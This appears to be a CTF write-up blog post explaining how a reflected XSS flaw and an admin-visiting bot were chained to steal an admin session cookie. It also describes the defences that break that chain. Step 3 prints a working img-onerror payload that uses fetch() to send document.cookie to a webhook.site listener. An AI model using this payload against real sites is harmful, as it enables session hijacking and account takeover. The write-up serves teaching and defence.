---
title: "Stealing an Admin Session with XSS and an Out-of-Band Listener"
date: 2026-11-12
lastmod: 2026-11-12
draft: false
summary: "A feedback form that reflects your input and an admin who visits the links you submit is everything you need to steal the admin's session cookie. Here I chain an XSS payload with an out-of-band listener so the victim's browser sends their cookie to me, and explain the admin-bot pattern and the defences that break it."
tags: ["web-security", "xss", "session-hijacking", "ctf", "bi0s"]
categories: ["Web Security"]
---

## Overview

Cross-site scripting (XSS) lets an attacker run JavaScript in another user's browser, in the context of a trusted site. The high-impact version isn't a popup alert, it's using that script to read something sensitive, like the victim's session cookie, and send it somewhere the attacker controls. When the victim is an administrator, stealing their session means inheriting their access.

This post works through the "Feedback" challenge from the **DD CTF** (a concluded, educational CTF by team [bi0s](https://bi0s.in/)). It has the two ingredients that make XSS matter: user input that gets executed, and an admin who will visit a URL you give them. The challenge even hands you the key constraint in its description: *Admin can only access localhost*.

> **Scope and ethics.** The target was a deliberately vulnerable CTF application that has since been retired. Only test XSS against systems you own or are authorised to assess, and never exfiltrate real users' data.

## Step 1: confirm the site executes input

The site reflected whatever I typed back into the page, which immediately suggests XSS. To confirm, I tried payloads from the well-known [payloadbox XSS list](https://github.com/payloadbox/xss-payload-list) until one executed. An image tag with an error handler worked:

```html
<img src=x onerror="/* JS runs here */">
```

`<img src=x>` requests an image from `x`, which fails to load, and the `onerror` handler fires. This is a reliable way to get JavaScript running without a `<script>` tag, which many naive filters miss. At this point I knew input was being rendered as live HTML, not escaped text.

## Step 2: understand the admin bot

A reflected payload that only runs in *my* browser is useless; I need it to run in the *admin's*. The feedback route is what makes that possible: it invites you to submit a URL, and an administrator then visits it. That "admin bot" is a common CTF (and real-world support-portal) pattern, and it's effectively a victim on demand.

The description's note that the admin can only reach `localhost` is the reason the attack has to steal something rather than just act: the admin's privileged pages live on localhost where I can't reach them, but the admin's *browser* can, and it carries the admin's cookies. If I can run script in that browser, I can make it read the cookie and send it out to me.

## Step 3: exfiltrate the cookie out-of-band

I set up a listener using [webhook.site](https://webhook.site/), which gives you a unique URL that logs every request it receives. Then the payload:

```html
<img src=x onerror="fetch('https://webhook.site/<my-id>/?c=' + document.cookie)">
```

When this runs in the admin's browser, the broken image fires `onerror`, which calls `fetch()` to my webhook URL with the admin's `document.cookie` appended as a query parameter. The admin's browser makes that request, so my listener receives the admin's session cookie. This is *out-of-band* exfiltration: the data doesn't come back to me through the vulnerable app, it comes directly from the victim's browser to infrastructure I control, which is exactly why the "admin only reaches localhost" restriction doesn't stop it.

## Step 4: deliver it through the admin bot

The last piece was getting the payload in front of the admin correctly. Submitting the webhook link directly to the feedback form did nothing, because the admin needs to load a page that *executes my script*, not just visit my logging endpoint. The working approach was to get the payload reflected by the application (so it renders as HTML on the trusted origin), take the resulting URL, and submit *that* URL to the feedback form. The admin visits it, my script runs on the site's origin with access to the site's cookies, and the cookie lands in my webhook. In this challenge the admin's cookie was itself the flag, `bi0s{...}`.

## Defending against this chain

Every link in the chain is a separate control, and breaking any one of them stops the attack:

- **Contextual output encoding.** Reflecting user input into HTML without encoding is the root cause. Encode on output for the context (HTML body, attribute, JS, URL) so input renders as text, never markup. This is the primary fix.
- **`HttpOnly` cookies.** A session cookie marked `HttpOnly` is not readable from JavaScript, so `document.cookie` can't exfiltrate it even if XSS fires.
- **Content Security Policy.** A strict CSP can block inline event handlers and disallow `fetch()` to arbitrary external origins, breaking both execution and exfiltration.
- **Framework auto-escaping.** Modern templating escapes by default; the danger is the `raw`/`dangerouslySetInnerHTML` escape hatches.

## Takeaways

- **Impactful XSS reads and exfiltrates.** The payoff here was `document.cookie` leaving the victim's browser, not an alert box.
- **`<img onerror>` runs JS without `<script>`,** which is why tag-blocklist filters fail.
- **The admin bot is the victim.** XSS plus a privileged user who visits your links equals session theft, even when their sensitive pages are on localhost.
- **`HttpOnly` + output encoding + CSP** each break the chain independently; use all three.

*Worked example: "Feedback", DD CTF by team bi0s. Flag redacted as `bi0s{...}`.*
